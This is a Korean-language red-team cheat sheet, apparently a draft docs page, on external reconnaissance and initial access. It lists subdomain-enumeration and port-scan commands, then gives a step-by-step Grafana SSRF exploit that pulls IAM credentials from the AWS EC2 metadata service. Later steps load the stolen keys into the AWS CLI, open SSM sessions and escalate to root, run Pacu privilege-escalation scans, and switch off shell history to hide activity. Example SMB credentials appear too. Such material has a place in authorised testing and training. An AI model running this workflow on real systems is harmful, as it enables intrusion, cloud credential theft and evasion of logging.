---
sidebar_position: 3
title: 외부 정찰 & 초기 침투 치트시트
description: 외부 정찰 및 초기 침투 단계의 주요 도구 및 명령어 빠른 참조
keywords: [RedTeam, 외부정찰, 초기침투, 치트시트, OPSEC]
draft: true
---

# 외부 정찰 & 초기 침투 치트시트

> 레드팀 작전의 외부 정찰 및 초기 침투 단계에서 사용하는 도구와 명령어 빠른 참조

## 도구 목록

| 도구 | 용도 | GitHub/설치 |
|------|------|-------------|
| **bbot** | 서브도메인 열거 (자동화) | `pipx install bbot` |
| **Amass** | 서브도메인 열거 (OSINT) | `apt install amass` |
| **subfinder** | 서브도메인 열거 (빠른 수동) | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| **theHarvester** | 이메일/서브도메인 수집 | `apt install theharvester` |
| **dnsx** | DNS 레코드 조회 | `go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest` |
| **IP2Provider** | IP → 클라우드 프로바이더 식별 | [github.com/oldrho/ip2provider](https://github.com/oldrho/ip2provider) |
| **grafana-ssrf.py** | Grafana SSRF 익스플로잇 | [vulhub/grafana-admin-ssrf](https://github.com/vulhub/vulhub/blob/master/grafana/admin-ssrf/grafana-ssrf.py) |
| **Pacu** | AWS 정보 수집 자동화 | `pipx install git+https://github.com/RhinoSecurityLabs/pacu.git` |
| **AWS CLI** | AWS 자원 관리 | `apt install awscli` |
| **AWS SSM Plugin** | SSM 세션 연결 | [AWS 공식 문서](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html) |

---

## 1. 외부 정찰 (External Reconnaissance)

### 서브도메인 열거

#### bbot
```bash
# 기본 서브도메인 열거 (passive only)
bbot -t target.com -p subdomain-enum -rf passive -ef portscan

# 예시
bbot -t raccoontech.work -p subdomain-enum -rf passive -ef portscan
```

**주요 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `-t` | Target 도메인 지정 | 스캔 대상 |
| `-p` | Preset 지정 | `subdomain-enum` = 서브도메인 열거 |
| `-rf` | Required Flag | `passive` = 수동 정찰만 (OPSEC) |
| `-ef` | Excluded Flag | `portscan` = 포트스캔 제외 (탐지 회피) |

**주요 출력**:
- DNS_NAME: 발견된 서브도메인
- ASN: IP 대역 및 클라우드 프로바이더 정보

#### Amass

```bash
# 설치
sudo apt install amass

# 수동 서브도메인 열거 (OSINT)
amass enum -passive -d target.com

# 예시
amass enum -passive -d raccoontech.work
```

**주요 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `enum` | 열거 모드 | 서브도메인 수집 |
| `-passive` | 수동 정찰만 | 타겟에 직접 접근 없음 (OPSEC) |
| `-d` | 도메인 지정 | 스캔 대상 도메인 |
| `-o` | 출력 파일 지정 | 결과를 파일로 저장 |

#### subfinder

```bash
# 설치
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# 서브도메인 열거
subfinder -d target.com -silent

# 예시
subfinder -d raccoontech.work -silent
```

**주요 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `-d` | 도메인 지정 | 스캔 대상 |
| `-silent` | 최소 출력 | 서브도메인만 출력 |
| `-o` | 출력 파일 | 결과 저장 |
| `-all` | 모든 소스 사용 | 최대한 많은 서브도메인 발견 |

#### theHarvester

```bash
# 설치
sudo apt install theharvester

# 기본 수집 (Google 소스)
theHarvester -d target.com -b google

# 예시
theHarvester -d raccoontech.work -b google,bing,linkedin
```

**주요 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `-d` | 도메인 지정 | 스캔 대상 |
| `-b` | 데이터 소스 지정 | `google`, `bing`, `linkedin`, `all` 등 |
| `-l` | 결과 제한 | 수집할 결과 개수 제한 (예: `-l 500`) |

#### dnsx

```bash
# 설치
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest

# DNS 레코드 조회 (서브도메인 목록 파일 필요)
cat subdomains.txt | dnsx -silent

# A 레코드만 조회
cat subdomains.txt | dnsx -a -resp-only -silent
```

**주요 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `-a` | A 레코드 조회 | IP 주소 확인 |
| `-aaaa` | AAAA 레코드 조회 | IPv6 주소 확인 |
| `-cname` | CNAME 레코드 조회 | 별칭 확인 |
| `-resp-only` | 응답만 출력 | IP 주소만 표시 |
| `-silent` | 최소 출력 | 결과만 출력 |

---

### DNS 조회

#### nslookup
```bash
# A 레코드 조회
nslookup subdomain.target.com

# TXT 레코드 조회 (SaaS, 메일 서비스 확인)
nslookup -type=TXT target.com

# 예시
nslookup stg-ap2-api04-monitor.raccoontech.work
```

**주요 옵션**:

| 옵션 | 설명 | 예시 |
|------|------|------|
| `-type=A` | A 레코드 (IP 주소) 조회 | 기본값 |
| `-type=TXT` | TXT 레코드 조회 | SaaS, SPF, 도메인 검증 정보 |
| `-type=MX` | 메일 서버 정보 | 이메일 게이트웨이 확인 |
| `-type=NS` | 네임서버 정보 | DNS 인프라 파악 |

---

### IP 대역 식별

#### IP2Provider
```bash
# 설치
cd /opt
git clone https://github.com/oldrho/ip2provider.git
cd ip2provider
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt

# IP → 클라우드 프로바이더 확인
python3 ip2provider.py <IP주소>

# 예시
python3 ip2provider.py 13.208.47.21
# 출력: 13.208.47.21 aws AMAZON ap-northeast-3
```

---

### 포트 스캐닝

#### nmap
```bash
# 특정 포트 스캔 (OPSEC 고려)
nmap -p <포트> -Pn -n --open <IP>

# 예시
nmap -p 3000 -Pn -n --open 13.208.47.21
```

**주요 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `-p` | 포트 지정 | 스캔할 포트 번호 또는 범위 (예: `-p 80,443` 또는 `-p 1-1000`) |
| `-Pn` | Ping 스캔 건너뛰기 | 호스트가 활성화되어 있다고 가정 (방화벽 우회) |
| `-n` | DNS 역조회 비활성화 | 속도 향상 및 DNS 쿼리 로그 방지 (OPSEC) |
| `--open` | 열린 포트만 표시 | 닫힌/필터링된 포트 제외 |

**권장 포트 목록**:
```
21,22,23,25,80,443,445,3389,3306,5432,5601,5984,6379,8080,8443,9200,27017
```

---

## 2. 작전 보안 (OPSEC)

### 다이나믹 포트 포워딩

```bash
# SSH 다이나믹 포트 포워딩 (프록시)
ssh -i <SSH키> -D <로컬포트> <유저>@<오퍼레이터서버IP>

# 예시
ssh -i ~/.ssh/redteamlite -D 8081 ubuntu@3.34.51.39
```

**주요 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `-i` | SSH 개인키 파일 경로 | 키 기반 인증에 사용 |
| `-D` | 다이나믹 포트 포워딩 | 로컬 포트를 SOCKS 프록시로 설정 (예: `-D 8081`) |

**Firefox 프록시 설정**:
1. 설정 → Proxy 검색
2. Network Settings → Manual proxy configuration
3. SOCKS Host: `127.0.0.1`, Port: `8081`

**확인**:
```bash
# 브라우저에서 접속
http://ipinfo.io/ip
# 오퍼레이터 서버의 IP가 나와야 함
```

---

### IP 확인

```bash
# 공인 IP 확인
curl ipinfo.io/ip

# 또는
curl ifconfig.me
```

---

## 3. 초기 침투 - Grafana SSRF

### Grafana SSRF 익스플로잇

```bash
# 익스플로잇 코드 다운로드
cd /opt
wget https://raw.githubusercontent.com/vulhub/vulhub/refs/heads/master/grafana/admin-ssrf/grafana-ssrf.py

# 기본 SSRF 테스트
python3 grafana-ssrf.py \
  -U <유저명> \
  -P '<비밀번호>' \
  -H http://<타겟호스트>:<포트> \
  -u http://169.254.169.254/latest/meta-data

# 예시
python3 grafana-ssrf.py \
  -U admin \
  -P 'wfa9cjb_myq-TQD*khz' \
  -H http://stg-ap2-api04-monitor.raccoontech.work:3000 \
  -u http://169.254.169.254/latest/meta-data
```

**주요 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `-U` | Grafana 유저명 | 로그인 계정 (기본값: `admin`) |
| `-P` | Grafana 비밀번호 | 로그인 패스워드 |
| `-H` | Grafana 호스트 URL | 타겟 Grafana 서버 (예: `http://target:3000`) |
| `-u` | SSRF 타겟 URL | 요청할 내부 URL (예: AWS 메타데이터 엔드포인트) |

### AWS EC2 메타데이터 탈취

```bash

# IAM Security Credentials 확인
python3 grafana-ssrf.py \
  -U admin -P 'password' \
  -H http://target:3000 \
  -u http://169.254.169.254/latest/meta-data/iam/security-credentials

# IAM Role의 키 탈취
python3 grafana-ssrf.py \
  -U admin -P 'password' \
  -H http://target:3000 \
  -u http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
```

> 169.254.169.254 : AWS EC2 Instance Metadata Service(IMDS)의 고정 주소

**출력 예시**:
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2025-05-02T06:33:59Z"
}
```

---

## 4. AWS 클라우드 정보 수집

### AWS CLI 설정

```bash
# JSON 파일 생성
vim rtl-ssrf.json
# 위에서 얻은 AccessKeyId, SecretAccessKey, Token 붙여넣기

# AWS CLI 프로필 설정
aws configure set profile.<프로필명>.aws_access_key_id "$(jq -r .AccessKeyId rtl-ssrf.json)"
aws configure set profile.<프로필명>.aws_secret_access_key "$(jq -r .SecretAccessKey rtl-ssrf.json)"
aws configure set profile.<프로필명>.aws_session_token "$(jq -r .Token rtl-ssrf.json)"
aws configure set profile.<프로필명>.region ap-northeast-3

# 예시
aws configure set profile.rtlssrf.aws_access_key_id "$(jq -r .AccessKeyId rtl-ssrf.json)"
aws configure set profile.rtlssrf.aws_secret_access_key "$(jq -r .SecretAccessKey rtl-ssrf.json)"
aws configure set profile.rtlssrf.aws_session_token "$(jq -r .Token rtl-ssrf.json)"
aws configure set profile.rtlssrf.region ap-northeast-3
```

**주요 AWS CLI 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `--profile` | AWS 프로필 이름 지정 | 여러 AWS 계정 관리 시 사용 |
| `--region` | AWS 리전 지정 | 특정 리전의 리소스 조회 (예: `ap-northeast-3`) |
| `--output` | 출력 형식 지정 | `json`, `text`, `table` 중 선택 (기본값: `json`) |

### AWS whoami

```bash
# 현재 IAM 신원 확인
aws sts get-caller-identity --profile <프로필명>

# 예시
aws sts get-caller-identity --profile rtlssrf
```

---

### SSM 정보 수집

```bash
# SSM으로 접근 가능한 EC2 인스턴스 목록
aws ssm describe-instance-information --profile <프로필명>

# 예시
aws ssm describe-instance-information --profile rtlssrf
```

**주요 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `--profile` | AWS CLI 프로필 지정 | 사용할 인증 정보 선택 |
| `--filters` | 필터링 조건 | 특정 조건의 인스턴스만 조회 (예: `Name=PlatformTypes,Values=Linux`) |

**주요 출력 항목**:
- `InstanceId`: EC2 인스턴스 ID
- `ComputerName`: 호스트명
- `IPAddress`: 사설 IP 주소
- `PlatformType`: OS 타입 (Linux/Windows)

---

### SSM 세션 연결

```bash
# 세션 매니저 플러그인 설치 (Ubuntu)
curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb" -o "session-manager-plugin.deb"
sudo dpkg -i session-manager-plugin.deb

# SSM 세션 시작
aws ssm start-session --profile <프로필명> --target <인스턴스ID>

# 예시
aws ssm start-session --profile rtlssrf --target i-07236096412fe9f4f

# 연결 후 루트 권한 획득
sudo su -
```

**주요 옵션**:

| 옵션 | 설명 | 용도 |
|------|------|------|
| `--profile` | AWS CLI 프로필 지정 | 사용할 인증 정보 |
| `--target` | 인스턴스 ID 지정 | 접속할 EC2 인스턴스 (예: `i-xxxxx`) |
| `--document-name` | Session Manager 문서 지정 | 포트 포워딩 등 특수 세션 타입 (선택사항) |

---

## 5. Pacu (AWS 자동화 정보 수집)

### 설치 및 기본 사용

```bash
# 설치
pipx install git+https://github.com/RhinoSecurityLabs/pacu.git

# 실행
pacu

# AWS CLI 프로필 가져오기
Pacu > import_keys <프로필명>

# 예시
Pacu (session:No Keys Set) > import_keys rtlssrf
```

### 주요 모듈

```bash
# IAM 권한 열거
Pacu > run iam__enum_permissions

# EC2 정보 수집
Pacu > run ec2__enum --regions ap-northeast-1,ap-northeast-2,ap-northeast-3

# 권한 상승 가능성 스캔
Pacu > run iam__privesc_scan

# AWS 콘솔 URL 생성 (브라우저 접속용)
Pacu > open_console
```

**주요 모듈 설명**:

| 모듈 | 설명 | 용도 |
|------|------|------|
| `iam__enum_permissions` | IAM 권한 열거 | 현재 계정의 모든 IAM 권한 확인 |
| `ec2__enum` | EC2 정보 수집 | 리전별 EC2 인스턴스, 보안그룹, VPC 등 수집 |
| `iam__privesc_scan` | 권한 상승 스캔 | 권한 상승 가능한 IAM 정책 탐지 |
| `open_console` | AWS 콘솔 URL 생성 | 브라우저에서 AWS 콘솔 접속 가능한 URL 생성 |

**주요 옵션**:

| 옵션 | 설명 | 예시 |
|------|------|------|
| `--regions` | 특정 리전만 스캔 | `--regions ap-northeast-1,ap-northeast-2` |

---

## 6. 리눅스 OPSEC 명령어

### 커맨드 히스토리 끄기

```bash
# 히스토리 완전히 비활성화
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
set +o history
```

**명령어 설명**:

| 명령어 | 설명 | 용도 |
|--------|------|------|
| `unset HISTFILE` | 히스토리 파일 경로 제거 | 히스토리가 디스크에 저장되지 않음 |
| `export HISTSIZE=0` | 메모리 히스토리 크기 0으로 설정 | 현재 세션에서 히스토리 미저장 |
| `export HISTFILESIZE=0` | 히스토리 파일 크기 0으로 설정 | 파일에 히스토리 미저장 |
| `set +o history` | 히스토리 기능 비활성화 | 명령어 히스토리 완전 차단 |

**주의**: 위 명령어 실행 후 화살표 위/아래키가 작동하지 않음

---

### 은밀한 정보 수집

#### 유저 및 그룹 확인

```bash
# whoami 대신
echo $USER

# groups 대신
echo "${GROUPS[@]}"
```

#### 네트워크 인터페이스 확인

```bash
# ip a 대신
ls /sys/class/net
```

#### IP 주소 확인

```bash
# ifconfig 대신
awk '/32 host/ { print f } {f=$2}' <<< "$(</proc/net/fib_trie)" | sort -fuV
```

#### DNS 확인

```bash
cat /etc/resolv.conf
```

#### 라우팅 테이블 확인

```bash
# route -n 대신
awk 'function hex2ip(h,ip){
  for(i=1;i<=4;i++){
    b=substr(h,9-i*2,2);
    ip=(ip?ip".":"")strtonum("0x"b)
  };
  return ip
}
NR==1{print;next}
{printf "%-8s %-15s %-15s %-15s\n",$1,hex2ip($2),hex2ip($3),hex2ip($8)}' /proc/net/route
```

---

### 파일 시스템 정보 수집

```bash
# /home 디렉토리 탐색
ls -alh /home

# 사용자 홈 디렉토리 확인
cd /home/<유저명>
ls -alh

# 히스토리 파일 확인 (조심스럽게)
cat .bash_history

# 스크립트/설정 파일 확인
cat .bashrc
cat .profile
```

---

### SSSD/도메인 조인 확인

```bash
# /etc/nsswitch.conf 확인
cat /etc/nsswitch.conf | grep sss

# SSSD 설정 확인
cat /etc/sssd/sssd.conf

# /etc/passwd에서 유저 검색
cat /etc/passwd | grep <유저명>
```

---

## 7. SMB 접근

### smbclient

```bash
# SMB 쉐어 접속 및 파일 목록
smbclient //<IP>/<쉐어명> -U "<도메인>\\<유저>%<비밀번호>" -c 'ls'

# 예시
smbclient //10.2.30.250/awsshare -U "US\\Mark.Shawn%Super@God" -c 'ls'
```

**주요 옵션**:

| 옵션 | 설명 | 예시 |
|------|------|------|
| `-U` | 유저 인증 정보 | `"도메인\\유저%비밀번호"` 형식 |
| `-c` | 명령어 실행 후 종료 | `'ls'`, `'get file.txt'` 등 |
| `-N` | 비밀번호 없이 접속 | 익명 접속 시도 시 사용 |
| `-L` | 사용 가능한 쉐어 목록 | `smbclient -L //<IP> -N` |

---

## 빠른 명령어 참조

### 정찰 워크플로우

```bash
# 1. 서브도메인 열거 (여러 도구 병렬 실행 권장)
bbot -t target.com -p subdomain-enum -rf passive -ef portscan
amass enum -passive -d target.com -o amass_results.txt
subfinder -d target.com -silent -o subfinder_results.txt

# 2. 서브도메인 병합 및 중복 제거
cat amass_results.txt subfinder_results.txt | sort -u > all_subdomains.txt

# 3. DNS 확인 (활성 서브도메인만 필터링)
cat all_subdomains.txt | dnsx -a -resp-only -silent > active_ips.txt

# 4. IP 대역 확인
cat active_ips.txt | while read ip; do python3 ip2provider.py $ip; done

# 5. 포트 스캔
nmap -p 80,443,3000,8080 -Pn -n --open -iL active_ips.txt
```

### 초기 침투 워크플로우

```bash
# 1. 프록시 설정 (OPSEC)
ssh -i ~/.ssh/key -D 8081 user@operator-ip

# 2. Grafana SSRF
python3 grafana-ssrf.py -U admin -P 'pass' -H http://target:3000 -u http://169.254.169.254/latest/meta-data/iam/security-credentials/<Role>

# 3. AWS CLI 설정
aws configure set profile.prof.aws_access_key_id "..."
aws configure set profile.prof.aws_secret_access_key "..."
aws configure set profile.prof.aws_session_token "..."

# 4. SSM 인스턴스 확인
aws ssm describe-instance-information --profile prof

# 5. SSM 세션 연결
aws ssm start-session --profile prof --target i-xxxxx
```

### OPSEC 워크플로우

```bash
# 1. 히스토리 끄기
unset HISTFILE; export HISTSIZE=0; export HISTFILESIZE=0; set +o history

# 2. 은밀한 정보 수집
echo $USER
ls /sys/class/net
awk '/32 host/ { print f } {f=$2}' <<< "$(</proc/net/fib_trie)" | sort -fuV
cat /etc/resolv.conf

# 3. 파일 시스템 탐색
ls -alh /home
cat /home/<user>/.bash_history
```

---

## 트러블슈팅 체크리스트

### SSH 다이나믹 포트 포워딩 실패

- [ ] SSH 키 권한: `chmod 600 ~/.ssh/key`
- [ ] 오퍼레이터 서버 보안그룹에서 내 IP 허용
- [ ] 로컬 포트 충돌 확인: `netstat -tlnp | grep 8081`

### Grafana SSRF 실패

- [ ] 로그인 계정 정보 확인
- [ ] 타겟 호스트가 AWS EC2인지 확인 (ip2provider)
- [ ] URL 형식 정확한지 확인: `http://169.254.169.254/...`

### AWS CLI 인증 실패

- [ ] JSON 파일 형식 확인: `jq . rtl-ssrf.json`
- [ ] 세션 토큰 만료 여부 확인 (Expiration 필드)
- [ ] 리전 설정 확인: `aws configure get region --profile prof`

### SSM 세션 연결 실패

- [ ] Session Manager 플러그인 설치 확인: `session-manager-plugin --version`
- [ ] 인스턴스 ID 정확한지 확인
- [ ] IAM 권한 확인: `ssm:StartSession` 권한 필요

---

## 참고 자료

### GitHub 저장소

**서브도메인 열거**:
- **bbot**: [https://github.com/blacklanternsecurity/bbot](https://github.com/blacklanternsecurity/bbot)
- **Amass**: [https://github.com/owasp-amass/amass](https://github.com/owasp-amass/amass)
- **subfinder**: [https://github.com/projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder)
- **theHarvester**: [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)
- **dnsx**: [https://github.com/projectdiscovery/dnsx](https://github.com/projectdiscovery/dnsx)

**클라우드 정보 수집**:
- **IP2Provider**: [https://github.com/oldrho/ip2provider](https://github.com/oldrho/ip2provider)

**초기 침투**:
- **Grafana SSRF**: [https://github.com/vulhub/vulhub/tree/master/grafana/admin-ssrf](https://github.com/vulhub/vulhub/tree/master/grafana/admin-ssrf)

**AWS 정보 수집**:
- **Pacu**: [https://github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)

### 공식 문서

- **AWS SSM Plugin**: [https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html)
- **AWS CLI**: [https://docs.aws.amazon.com/cli/](https://docs.aws.amazon.com/cli/)

### 관련 기술

- **분산 스캐닝**: [Ax Framework](https://github.com/attacksurge/ax)
- **분산 비밀번호 스프레잉**: [CredMaster](https://github.com/knavesec/CredMaster)

---

**작성일**: 2025년 12월 06일
**태그**: #RedTeam #외부정찰 #초기침투 #OPSEC #치트시트 #AWS #Grafana #SSRF
